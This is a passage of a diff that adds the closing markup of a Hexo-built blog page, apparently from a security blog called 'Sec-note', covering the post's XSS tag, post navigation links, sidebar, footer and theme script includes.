+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/13/Java学习笔记/" rel="next" title="java 基础知识学习">
+                <i class="fa fa-chevron-left"></i> java 基础知识学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/17/PHP/" rel="prev" title="PHP 面向对象">
+                PHP 面向对象 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#参考"><span class="nav-number">1.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
